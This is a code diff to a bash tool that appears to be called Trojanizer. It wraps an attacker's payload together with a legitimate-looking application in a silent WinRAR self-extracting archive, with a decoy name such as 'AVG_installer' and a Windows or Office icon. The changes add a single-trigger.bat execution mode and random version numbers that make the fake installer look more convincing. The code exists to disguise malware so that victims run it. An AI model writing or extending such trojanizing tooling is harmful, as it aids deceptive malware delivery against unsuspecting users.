@@ -54,6 +54,7 @@ WINRAR_PATH=`cat $IPATH/settings | egrep -m 1 "WINRAR_PATH" | cut -d '=' -f2` > 
 ArCh=`cat $IPATH/settings | egrep -m 1 "SYSTEM_ARCH" | cut -d '=' -f2` > /dev/null 2>&1 # sellected arch to use in Trojanizer.sh
 LoGo=`cat $IPATH/settings | egrep -m 1 "USE_LOGO" | cut -d '=' -f2` > /dev/null 2>&1 # EXTRA: replace SFX logo (image.bmp) ?
 PRES=`cat $IPATH/settings | egrep -m 1 "PRE_SETUP" | cut -d '=' -f2` > /dev/null 2>&1 # EXTRA: use presetup to exec befor extract ?
+SIN_GL=`cat $IPATH/settings | egrep -m 1 "SINGLE_EXEC" | cut -d '=' -f2` > /dev/null 2>&1 # EXTRA: execute only one file ?
 #
 # Config user system correct arch
 # Command syntax to be used based on arch sellected ..
@@ -281,7 +282,14 @@ binary_path=$(zenity --title "☠ PAYLOAD TO BE COMPRESSED ☠" --filename=$IPAT
      fi
 
 
-legit_path=$(zenity --title "☠ LEGIT APPLICATION TO TROJANIZE ☠" --filename=$IPATH --file-selection --text "chose legit application/agent") > /dev/null 2>&1
+#
+# Use advanced option [SINGLE_FILE_EXECUTION]
+#
+if [ "$SIN_GL" = "ON" ]; then
+  legit_path=$(zenity --title "☠ INPUT TRIGGER.bat LOCATION ☠" --filename=$IPATH --file-selection --text "Input trigger.bat script thats going\nto execute: $Str") > /dev/null 2>&1
+else
+  legit_path=$(zenity --title "☠ LEGIT APPLICATION TO TROJANIZE ☠" --filename=$IPATH --file-selection --text "chose legit application/agent") > /dev/null 2>&1
+fi
 N4m3=$(zenity --title="☠ Input SFX FILENAME ☠" --text "example: AVG_installer" --entry --width 300) > /dev/null 2>&1
 IcOn=$(zenity --list --title "☠ ICON REPLACEMENT  ☠" --text "Chose one icon from the list." --radiolist --column "Pick" --column "Option" TRUE "Windows-black.ico" FALSE "Windows-Metro.ico" FALSE "Microsoft-Excel.ico" FALSE "Microsoft-Word.ico" FALSE "Windows-Logo.ico" FALSE "Windows-Store.ico" FALSE "Input your own icon" --width 330 --height 330) > /dev/null 2>&1
 # Input your own icon.ico ?
@@ -347,18 +355,25 @@ sleep 2
 #
 # build SFX configuration file (bin/xsf.conf)
 #
+# random version numbers
+RAN_D=$(cat /dev/urandom | tr -dc '0-9' | fold -w 1 | head -n 1)
+RUN_T=$(cat /dev/urandom | tr -dc '0-9' | fold -w 2 | head -n 1)
 echo "; The sfx archive title" > $IPATH/bin/xsf.conf
-echo "Title=$N4m3 Corporate Edition" >> $IPATH/bin/xsf.conf
+echo "Title=$N4m3 v$RAN_D.$RUN_T Corporate Edition" >> $IPATH/bin/xsf.conf
   #
   # use Presetup program/command to exec before extraction ..
   #
   if [ "$PRES" = "ON" ]; then
-    echo "; Presetup program/command to execute before extraction" >> $IPATH/bin/xsf.conf
+    echo "; Program/command to execute before extraction" >> $IPATH/bin/xsf.conf
     echo "Presetup=$MyPr" >> $IPATH/bin/xsf.conf
   fi
-echo "; The path to the setup executables" >> $IPATH/bin/xsf.conf
-echo "Setup=$ST_O" >> $IPATH/bin/xsf.conf
-echo "Setup=$ST_D" >> $IPATH/bin/xsf.conf
+  echo "; The path to the setup executables" >> $IPATH/bin/xsf.conf
+  if [ "$SIN_GL" = "ON" ]; then
+    echo "Setup=$ST_D" >> $IPATH/bin/xsf.conf
+  else
+    echo "Setup=$ST_O" >> $IPATH/bin/xsf.conf
+    echo "Setup=$ST_D" >> $IPATH/bin/xsf.conf
+  fi
 echo "; Use semi-silent mode" >> $IPATH/bin/xsf.conf
 echo "Silent=1" >> $IPATH/bin/xsf.conf
 echo "; Overwrite any existing files" >> $IPATH/bin/xsf.conf
